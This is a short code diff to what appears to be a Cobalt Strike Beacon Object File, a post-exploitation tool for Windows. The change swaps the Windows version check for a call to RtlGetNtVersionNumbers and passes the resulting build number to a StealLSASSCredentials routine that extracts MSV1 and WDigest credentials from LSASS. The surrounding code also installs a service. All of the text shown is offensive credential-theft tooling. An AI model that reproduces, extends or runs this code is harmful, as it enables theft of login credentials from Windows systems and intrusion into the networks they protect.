@@ -102,18 +102,10 @@ int go(char *args, int argLen)
     }
 
 
-    // Get Windows Versions
-    char WindowsVersion[32];
-    if (!GetWinVersion(WindowsVersion, sizeof(WindowsVersion)))
-    {
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
-        BeaconFormatFree(&outputbuffer);
-        return FALSE;
-    }
-    BeaconFormatPrintf(&outputbuffer, "[+] Windows Version: %s\n", WindowsVersion);
-
-    char* WindowsBuild = GetWinBuildNumber();
-    BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %s\n", WindowsBuild);
+    DWORD NT_MAJOR_VERSION, NT_MINOR_VERSION, NT_BUILD_NUMBER;
+    RtlGetNtVersionNumbers(&NT_MAJOR_VERSION, &NT_MINOR_VERSION, &NT_BUILD_NUMBER);
+    NT_BUILD_NUMBER &= 0x7FFF;
+    BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %ld\n", NT_BUILD_NUMBER);
 
 
     // Install service
@@ -159,7 +151,7 @@ int go(char *args, int argLen)
     }
 
 
-    if (!StealLSASSCredentials(hFile, WindowsVersion, RetrieveMSV1Credentials, RetrieveWDigestCredentials))
+    if (!StealLSASSCredentials(hFile, NT_BUILD_NUMBER, RetrieveMSV1Credentials, RetrieveWDigestCredentials))
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Failed to retrieve LSASS credentials!\n\n");
     }
